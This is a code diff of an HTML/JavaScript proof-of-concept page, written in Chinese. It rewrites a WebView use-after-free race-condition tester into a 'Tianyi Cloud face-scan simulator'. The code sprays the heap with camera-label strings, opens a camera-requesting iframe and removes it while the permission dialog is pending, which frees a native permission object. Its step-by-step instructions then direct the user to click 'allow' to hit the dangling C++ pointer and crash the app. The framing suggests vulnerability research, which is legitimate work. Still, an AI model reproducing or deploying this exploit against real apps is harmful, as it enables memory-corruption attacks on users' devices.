@@ -3,125 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebView UAF 稳定性压测 (可视化调试版)</title>
+    <title>电信天翼云刷脸场景精准模拟器</title>
     <style>
-        body { font-family: -apple-system, sans-serif; text-align: center; padding: 20px; background: #fafafa; color: #333; }
-        .card { max-width: 550px; margin: 0 auto; background: white; padding: 25px; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.06); border: 1px solid #e5e5e7; }
-        .btn { padding: 14px 28px; font-size: 16px; font-weight: 600; color: white; border: none; border-radius: 10px; cursor: pointer; transition: all 0.2s; width: 100%; margin-bottom: 12px; }
-        .btn-primary { background: #007aff; }
-        .btn-danger { background: #ff3b30; }
-        .btn:disabled { background: #aeaeae; cursor: not-allowed; }
-        
-        /* 仪表盘样式 */
-        .slider-container { margin: 20px 0; text-align: left; background: #f5f5f7; padding: 15px; border-radius: 8px; }
-        .slider-label { display: flex; justify-content: space-between; font-weight: bold; margin-bottom: 8px; }
-        input[type=range] { width: 100%; }
-        
-        /* 屏幕实时日志区 */
-        .console-box { text-align: left; background: #1e1e1e; color: #7cfc00; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; height: 180px; overflow-y: auto; margin-top: 15px; box-shadow: inset 0 0 10px #000; }
+        body { font-family: -apple-system, sans-serif; text-align: center; padding: 30px 20px; background: #f4f5f6; }
+        .card { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+        .btn { padding: 16px; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 12px; cursor: pointer; width: 100%; margin-bottom: 15px; display: block; }
+        .btn-blue { background: #007aff; }
+        .btn-orange { background: #ff9500; }
+        .console { text-align: left; background: #222; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 13px; min-height: 100px; }
+        .step { text-align: left; font-size: 14px; line-height: 1.6; background: #fff9e6; padding: 15px; border-radius: 8px; margin-top: 15px; border-left: 5px solid #ff9500; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>🛸 WebView 漏洞对撞仪表盘</h2>
-        <p style="color: #86868b; font-size: 14px;">支持时序微调与前端屏幕日志</p>
-        
-        <button class="btn btn-primary" id="btnAuth" onclick="unlockCameraLabels()">1. 第一步：解锁相机真实标签</button>
-        
-        <div class="slider-container">
-            <div class="slider-label">
-                <span>⏱️ Iframe 强拆延迟 (时序窗口):</span>
-                <span id="delayVal" style="color:#007aff">30 ms</span>
-            </div>
-            <input type="range" id="delaySlider" min="5" max="150" value="30" oninput="updateDelayVal(this.value)">
-            <p style="font-size:11px; color:#86868b; margin:5px 0 0 0;">如果 Java 层没收到打印，请把滑块往右调（增大延迟）；如果直接弹窗没触发销毁，往左调。</p>
-        </div>
+<div class="card">
+    <h2>🛸 天翼云人脸识别时序模拟</h2>
+    <p style="color: #666; font-size: 14px;">还原真实 H5 刷脸组件生命周期断层</p>
 
-        <button class="btn btn-danger" id="btnAttack" onclick="triggerRaceConditionAttack()" disabled>2. 第二步：开启自动化时序对撞</button>
-        
-        <div class="console-box" id="screenConsole">--- 屏幕日志等待输出 ---</div>
+    <button class="btn btn-blue" id="btn1" onclick="unlockLabels()">1. 第一步：解锁相机真实标签</button>
+    <button class="btn btn-orange" id="btn2" onclick="startFaceIdSimulation()" disabled>2. 第二步：模拟进入刷脸页面</button>
+
+    <div class="console" id="logBox">等待操作...</div>
+
+    <div class="step">
+        <strong>💡 现网闭环复现步骤：</strong><br>
+        1. 点击<strong>第一步</strong>，在系统弹窗中允许权限。确保日志显示“标签已解锁”。<br>
+        2. 点击<strong>第二步</strong>，网页会模拟天翼云加载刷脸组件，此时 App <strong>一定会再次弹出权限申请框</strong>，Java 层日志开始打印。<br>
+        3. <span style="color:red; font-weight:bold;">盯紧下方的绿色日志盒</span>，当看到提示 <span style="color:#00ff00;">"⚠️ 后台已强拆刷脸组件！"</span> 时……<br>
+        4. **这时候，再去点击屏幕上残留的系统权限弹窗（允许）**。App 将瞬间崩溃，精准撞击 C++ 层的指针！
     </div>
+</div>
 
-    <script>
-        let isLabelsUnlocked = false;
-        let destroyDelay = 30; // 默认 30ms 留给 IPC 通信
+<script>
+    let labelsUnlocked = false;
 
-        function updateDelayVal(val) {
-            destroyDelay = parseInt(val);
-            document.getElementById('delayVal').innerText = val + " ms";
-        }
+    function printLog(msg) {
+        document.getElementById('logBox').innerHTML = msg;
+    }
 
-        function screenLog(msg) {
-            const consoleBox = document.getElementById('screenConsole');
-            const time = new Date().toLocaleTimeString().split(' ')[0];
-            consoleBox.innerHTML += `[${time}] ${msg}<br>`;
-            consoleBox.scrollTop = consoleBox.scrollHeight; // 自动滚动到底部
-        }
-
-        // 1. 解锁真实标签
-        function unlockCameraLabels() {
-            screenLog("正在请求初次授权...");
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    stream.getTracks().forEach(track => track.stop());
-                    navigator.mediaDevices.enumerateDevices().then(devices => {
-                        const hasLabels = devices.some(d => d.label && d.label.length > 0);
-                        if (hasLabels) {
-                            isLabelsUnlocked = true;
-                            document.getElementById('btnAttack').disabled = false;
-                            document.getElementById('btnAuth').disabled = true;
-                            screenLog("✅ 真实标签解锁成功！堆污染源已就绪。");
-                        } else {
-                            screenLog("❌ 警告：未拿到设备名，请在系统弹窗允许权限。");
-                        }
-                    });
-                })
-                .catch(err => {
-                    screenLog("❌ 授权失败: " + err.name);
-                });
-        }
-
-        // 2. 开启对撞
-        function triggerRaceConditionAttack() {
-            if (!isLabelsUnlocked) return;
-            screenLog(`🔥 对撞启动！当前强拆窗口: ${destroyDelay}ms`);
-
-            // 堆填充：密集清洗堆空间
-            setInterval(() => {
+    // 1. 先满足隐私策略，让底层多媒体填坑字符串生效
+    function unlockLabels() {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                stream.getTracks().forEach(t => t.stop());
                 navigator.mediaDevices.enumerateDevices().then(devices => {
-                    let dummy = devices.map(d => d.label).join(","); 
-                }).catch(()=>{});
-            }, 1);
+                    labelsUnlocked = true;
+                    document.getElementById('btn2').disabled = false;
+                    document.getElementById('btn1').disabled = true;
+                    printLog("✅ 真实标签已解锁！堆污染源就绪。");
+                });
+            }).catch(e => printLog("❌ 授权失败，请允许权限"));
+    }
 
-            // 时序对撞主体
-            setInterval(() => {
-                let iframe = document.createElement('iframe');
-                iframe.allow = "camera; microphone"; // 穿透策略
-                
-                // ⭐【改动点】使用 srcdoc 代替 about:blank，确保 100% 继承同源策略，不被内核安全沙箱拦截
-                iframe.srcdoc = `
-                    <script>
-                        navigator.mediaDevices.getUserMedia({ video: true })
-                            .then(() => parent.screenLog("🟢 Iframe 请求成功(未撞上)"))
-                            .catch(err => {
-                                // 如果撞上了强拆，前端通常会抛出 AbortError
-                                if(err.name === 'AbortError') {
-                                    parent.screenLog("⚡ 捕获到内核强拆信号 (AbortError)！");
-                                }
-                            });
-                    <\/script>
-                `;
-                
-                document.body.appendChild(iframe);
+    // 2. 核心：模拟天翼云 H5 刷脸组件的单次生命周期
+    function startFaceIdSimulation() {
+        printLog("🎬 模拟开始：正在加载 H5 刷脸组件...");
 
-                // 根据滑块设定的时间进行强拆
-                setTimeout(() => {
-                    iframe.remove();
-                }, destroyDelay);
+        // 启动背景多媒体堆充填（源源不断生成带有 camera2 的字符串洗刷堆内存）
+        setInterval(() => {
+            navigator.mediaDevices.enumerateDevices().then(devices => {
+                let dummy = devices.map(d => d.label).join(",");
+            }).catch(()=>{});
+        }, 1);
 
-            }, destroyDelay + 10); // 留出一点空隙进入下一个循环
-        }
-    </script>
+        // 动态创建天翼云刷脸沙箱 Iframe
+        let faceIframe = document.createElement('iframe');
+        faceIframe.allow = "camera; microphone";
+        faceIframe.srcdoc = `
+            <script>
+                // 刷脸页面一加载，立刻申请摄像头
+                navigator.mediaDevices.getUserMedia({ video: true }).catch(e=>{});
+            <\/script>
+        `;
+        document.body.appendChild(faceIframe);
+
+        // ⏳ 给 IPC 留出绝对充足的时间（1.5秒），保证弹窗绝对已经到了 Java 层并显示在屏幕上
+        setTimeout(() => {
+            
+            // 💥【现网绝杀点】：用户还没来得及点击允许，或者刷脸组件判定超时/取消
+            // 网页无情强拆 Iframe，C++ 层的 AwPermissionRequest 被内核单方面 delete
+            faceIframe.remove();
+            
+            printLog("<span style='color:#ff3b30; font-weight:bold;'>⚠️ 后台已强拆刷脸组件（C++ 对象已死）！<br>🔥 快！现在立刻去点击屏幕上的允许按钮！</span>");
+            
+        }, 1500); 
+    }
+</script>
+
 </body>
 </html>
